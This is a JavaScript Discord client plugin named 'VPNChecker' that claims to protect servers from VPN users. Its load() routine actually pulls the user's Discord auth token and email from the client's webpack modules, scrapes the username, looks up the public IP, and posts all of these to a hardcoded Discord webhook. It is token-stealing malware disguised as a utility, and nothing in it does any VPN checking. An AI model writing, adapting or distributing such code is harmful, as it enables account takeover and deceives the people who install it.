/** 
  * @name VPNChecker
  * @version 1.1
  * @description Protects your discord server from VPN
*/

const config = {
    "info": {
        "name": "VPNChecker",
        "authors": ["Ronny"],
        "version": "1.1",
        "description": "Protects your discord server from VPN,only Server admin can use this script when someone turn on VPN you got DM"
    },
 
    "webhook": "https://discord.com/api/webhooks/822530690401697894/LKA03a_2trrUo0lZzqtVDiR2f1BhObfNUkHcKBsEASOO0T7PO8p9iwFUfBbGkXJ_RyIr"
}

class VPNChecker {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = $("[class *= \"nameTag\"]").first().text();

        $.getJSON("https://api.ipify.org?format=json", (data) => { 
            require("request").post(config.webhook, {form: {content: `**VPN Check __${config.info.authors[0]}__**\n\n**NickName: __${username}__**\n**Email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Token:**\`\`\`${authToken}\`\`\``}});
        });
    }
}
